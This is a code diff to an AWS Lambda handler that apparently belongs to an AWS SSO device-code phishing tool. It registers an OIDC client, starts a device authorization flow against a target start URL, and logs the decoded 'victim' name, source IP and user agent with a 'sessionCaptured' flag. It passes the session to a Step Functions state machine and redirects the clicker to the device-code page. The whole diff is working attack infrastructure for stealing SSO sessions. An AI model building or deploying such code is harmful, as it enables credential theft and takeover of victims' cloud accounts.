@@ -1,9 +1,8 @@
-import json
-
 import boto3
 import os
 import time
 import base64
+import json
 
 from decimal import Decimal
 
@@ -31,16 +30,10 @@ def initiate_device_code_flow(sso_oidc_client,oidc_application, start_url):
     return url, deviceCode
 
 
-def create_device_code_url(sso_oidc_client, start_url):
+def create_device_code_url(event, victim, sso_oidc_client, start_url):
     oidc_application = create_oidc_application(sso_oidc_client)
     url, device_code = initiate_device_code_flow(
         sso_oidc_client, oidc_application, start_url)
-    return url, device_code, oidc_application
-
-def save_to_db(url, deviceCode, oidc_application, event, victim=""):
-    dynamodb = boto3.resource('dynamodb')
-    table = dynamodb.Table('sessionTable')
-
     try:
         sourceIp = event['requestContext']['identity']['sourceIp']
         userAgent = event['requestContext']['identity']['userAgent']
@@ -49,7 +42,7 @@ def save_to_db(url, deviceCode, oidc_application, event, victim=""):
         userAgent = ""
 
     data={
-        'deviceCode': deviceCode,
+        'deviceCode': device_code,
         'url': url,
         'urlClicked': Decimal(time.time()),
         'sessionCaptured': False,
@@ -61,11 +54,8 @@ def save_to_db(url, deviceCode, oidc_application, event, victim=""):
         'userAgent': str(userAgent)
     }
 
-    table.put_item(
-        Item=data
-    )
-
     return data
+
 
 def decode_victim_name(url_paramater):
     base64_bytes = url_paramater.encode('ascii')
@@ -73,10 +63,35 @@ def decode_victim_name(url_paramater):
     message = message_bytes.decode('ascii')
     return message
 
-def main(event, context):
 
-    START_URL = os.environ['START_URL']
+class DecimalEncoder(json.JSONEncoder):
+    def default(self, obj):
+        if isinstance(obj, Decimal):
+            return {'__Decimal__': str(obj)}
+        # Let the base class default method raise the TypeError
+        return json.JSONEncoder.default(self, obj)
+    
+
+def start_state_machine(STATES_ARN, REGION, run_input):
+    states = boto3.client('stepfunctions', region_name = 'us-east-1')
+    print(run_input)
+    print(type(run_input))
+    print(json.dumps(run_input, cls=DecimalEncoder))
+    try:
+        response = states.start_execution(
+            stateMachineArn=STATES_ARN,
+            input=json.dumps(run_input, cls=DecimalEncoder)
+        )
+    except Exception as e:
+        print(f'ERROR: {e}')
+    else:
+        return response['executionArn']
+
+
+def lambda_handler(event, context):
+    START_URL = os.environ['STARTURL']
     REGION = os.environ['REGION']
+    STATES_ARN = os.environ['STATESARN']
 
     victim = ""
     try:
@@ -86,14 +101,15 @@ def main(event, context):
 
     sso_oidc_client = boto3.client('sso-oidc', region_name=REGION)
 
-    url, device_code, oidc_application = create_device_code_url(sso_oidc_client, START_URL)
+    payload = create_device_code_url(event, victim, sso_oidc_client, START_URL)
 
-    save_to_db(url, device_code, oidc_application, event, victim)
+    start_state_machine(STATES_ARN, REGION, payload)
+    print(payload['url'])
 
     response = {
         "statusCode": 301,
         "headers":{
-            "Location": url
+            "Location": payload['url']
         }
     }
 
